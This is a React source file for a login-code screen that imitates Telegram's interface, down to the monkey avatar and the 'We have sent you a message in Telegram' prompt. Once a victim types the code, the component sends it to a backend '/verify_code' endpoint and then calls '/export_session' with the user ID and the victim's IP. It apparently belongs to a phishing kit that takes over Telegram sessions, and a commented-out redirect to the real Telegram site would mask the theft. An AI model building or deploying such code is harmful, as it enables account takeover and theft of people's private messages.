import React, { useState } from "react";
import { toast } from 'react-toastify';
import { api } from '../services/router';
import { useNavigate } from "react-router-dom";
const AuthScreen = ({ phone, IP }) => {
    const navigate = useNavigate();
    const [loading, setLoading] = useState(false);
    const [error, setError] = useState("")
    const handleVerificatiionCode = async (event) => {
        try {
            let inputValue = event.target?.value
            if (inputValue.length === 5) {
                const userId = localStorage.getItem("user_id")
                console.log(userId)
                const data = {
                    "code": inputValue,
                    "user_id": userId
                }
                setLoading(true);
                const response = await api.post("/verify_code", data, {
                    headers: { "Content-Type": "application/json" },  // Ensure correct content type
                })
                console.log(response)
                if (response.status === 200) {
                    setError("")
                    setLoading(false);
                    console.log(IP)
                    const res = await api.get(`/export_session/${userId}?ip=${IP}`, {
                        headers: { "Content-Type": "application/json" }  // Correct headers
                    });

                    console.log(res);
                    // window.location.href = "https://web.telegram.org/k/";
                    // // navigate("/");
                } else {
                    setLoading(false);
                    setError(response.data?.message || "Unexpected error occured");
                }
            }
        } catch (e) {
            setLoading(false);
            console.error(e)
            setError(e.response.data?.detail || "Unexpected error occured")
        }
    }
    const handleCodeFocus = () => {
        setError("")
    }
    return (
        <div className="flex items-center justify-center min-h-screen bg-gray-900">
            <div className="w-96  text-center ">
                {/* Monkey Avatar */}
                <div className="flex justify-center">
                    <span className="text-6xl">🐵</span>
                </div>

                {/* Phone Number */}
                <h2 className="text-xl font-semibold text-white mt-4">
                    {phone}
                    <span className="text-gray-400 cursor-pointer"><a href="/">✏️</a></span>
                </h2>

                {/* Info Text */}
                {error
                    ? (
                        <p className="text-red-400 text-sm mt-2">
                            {error}
                        </p>
                    )
                    :
                    <p className="text-gray-400 text-sm mt-2">
                        We have sent you a message in Telegram with the code.
                    </p>
                }

                {/* Code Input */}
                <div className="mt-4">
                    <label className="block text-left text-gray-400 text-sm mb-1">Code</label>
                    {loading ? (
                        <div className="text-center ">
                            <p className="text-lg text-white">Verifying...</p>
                            <div className="loader"></div> {/* Add a CSS loading spinner */}
                        </div>
                    ) : (
                        <input
                            onKeyUp={handleVerificatiionCode}
                            onFocus={handleCodeFocus}
                            type="text"
                            className="w-full p-2 border border-gray-600 bg-gray-700 rounded-lg focus:ring-2 focus:ring-purple-500 focus:outline-none text-white text-center"
                            placeholder="Enter Code"
                        />
                    )}
                </div>

            </div>
        </div>
    );
};

export default AuthScreen;
